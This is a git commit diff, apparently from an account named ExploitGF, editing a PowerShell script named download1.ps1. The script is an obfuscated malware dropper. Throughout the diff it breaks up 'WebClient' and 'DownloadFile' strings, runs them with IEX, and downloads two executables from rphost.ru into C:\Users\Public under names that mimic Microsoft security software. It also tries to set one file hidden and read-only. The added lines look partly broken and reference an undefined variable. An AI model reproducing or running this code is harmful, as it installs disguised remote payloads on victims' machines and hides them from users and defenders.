6259cae32386b50fb5222503b6ab2b08aab293df
ExploitGF <32704607+ExploitGF@users.noreply.github.com>
2018-08-31 12:29:24 +0500

    Update download1.ps1

--- download1.ps1
+++ download1.ps1
@@ -1,9 +1,10 @@
-$splited= "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
+$splited = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/64.signed','C:\Users\Public\MSASC.exe')"
 $unsplited = $splited.Replace("~~","")
 IEX $unsplited
 
-$split= "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
+$split = "(New-Object System.Net.Web~~Client).Downlo~~adFile('http://rphost.ru:5885/MS_ASC64_1.signed','C:\Users\Public\MSASCuiL.exe')"
 $unsplit = $split.Replace("~~","")
 IEX $unsplit
-Ge't-It'em ('C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe') | ('fo'+'re'+'ach' {'$_'+'.Att'+'rib'+'utes' = "'Re'+'adO'+'nly', 'Hi'+'dden'"})
-
+$splt = "'C'+':\'+'User'+'s\'+'Pub'+'lic\'+'MSAS'+'Cui'+'L.e'+'xe'" | fo're'ach {'$_'+'.At'tr?ibu%t'es' = 'ReadOnly, Hidden'}
+$syscall = $ScriptBlock.Replace("?","").Replace("'","").Replace("+","").Replace("%","")
+Ge't-It'em $syscall
